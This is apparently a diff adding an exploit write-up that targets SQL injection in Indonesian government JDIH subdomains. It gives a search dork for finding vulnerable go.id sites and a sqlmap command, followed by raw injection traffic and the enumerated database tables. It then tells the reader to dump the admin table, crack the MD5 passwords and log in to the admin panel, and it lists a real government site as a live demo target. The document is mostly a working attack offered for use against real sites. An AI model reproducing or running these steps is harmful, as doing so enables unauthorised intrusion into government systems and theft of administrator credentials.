@@ -1,0 +1,63 @@
+####################################################
+# Exploit title: JDIH Subdomain SQL Injection Vulnerability
+# Dork: site:go.id inurl:jdih "?page=content"
+# Author: L4663r666h05t x Indonesian Code Party
+
+####################################################
+
+Dorking first, then find a site like this, only example.
+http://jdih.localhost.com/?page=content&id=(NUMBER)&nama_content=CONTENT_NAME
+
+I cant manual SQL Injection so i using SQLMAP.
+type command:
+sqlmap.py -u "http://jdih.localhost/?page=content&id=10*&nama_content=CONTENT_NAME" --dbs -v5
+
+Result:
+
+[TRAFFIC IN] HTTP response [#100] (200 OK):
+Server: nginx
+Date: Mon, 08 Jul 2019 02:43:41 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Encoding: gzip
+URI: http://jdih.localhost:80/?page=content&id=-6247%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2C%28SELECT%20CONCAT%280x716a6b6a71%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x717a767171%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%201%2C1%29%2CNULL--%20vZai&nama_content=Sejarah%20JDIH
+[10:43:42] [DEBUG] performed 3 queries in 1.07 seconds
+available databases [2]:
+[*] dbname
+[*] information_schema
+
+Table:
+Database: dbname
+[15 tables]
++---------------------+
+| admin               |
+| berita              |
+| contact             |
+| content             |
+| hitscounter         |
+| konter              |
+| link                |
+| look                |
+| nonperaturan        |
+| pengetahuan_praktis |
+| peraturan           |
+| peraturan_cat       |
+| profil              |
+| template            |
+| usersonline         |
++---------------------+
+
+Now you dump the admin columns. decrypt the MD5 Password & Find admin login form.
+
+You can check http://jdih.localhost/admin/ or http://jdih.localhost/adminweb/ or http://jdih.localhost/administrator/
+
+Demo:
+http://jdih.labuhanbatukab.go.id/?page=content&id=2&nama_content=Sejarah%20JDIH
+
+################################################################
+Thanks to: Mr.Vendetta_404 - KID2ZON3 - Indonesian Code Party
+################################################################
+
